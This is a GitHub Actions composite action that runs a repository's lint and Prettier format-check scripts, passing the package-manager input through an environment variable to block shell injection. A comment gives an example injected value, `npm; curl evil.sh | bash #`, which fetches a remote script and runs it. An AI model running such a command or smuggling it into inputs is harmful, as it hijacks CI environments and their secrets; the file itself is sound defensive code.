name: Lint and format check
description: >
  Run the calling repo's `lint` script and (optionally) its
  `format:check` script via the chosen package manager. Pulled out of
  the MCP CI lint job so a future tooling switch (e.g. ESLint flat
  config rollout, Prettier replacement) lands in a single PR here.

inputs:
  package-manager:
    description: Package manager to invoke the scripts (npm | pnpm | yarn).
    required: false
    default: npm
  run-format-check:
    description: Run the `format:check` script after lint (set to "false" to skip).
    required: false
    default: "true"

runs:
  using: composite
  steps:
    # Both steps route `inputs.package-manager` through an env var
    # instead of `${{ … }}` interpolation directly in `run:`. GitHub
    # Actions expands `${{ … }}` BEFORE the shell sees the command line,
    # so a caller-supplied value like `npm; curl evil.sh | bash #` would
    # execute injected commands in the caller's CI context. Passing the
    # value through `env:` and quoting `"$PM"` keeps it a single argv
    # token regardless of contents. Same pattern as
    # reusable-node-ci.yml's Build / Test steps.
    - name: ESLint
      shell: bash
      env:
        PM: ${{ inputs.package-manager }}
      run: '"$PM" run lint'

    - name: Prettier (check)
      if: inputs.run-format-check == 'true'
      shell: bash
      env:
        PM: ${{ inputs.package-manager }}
      run: '"$PM" run format:check'
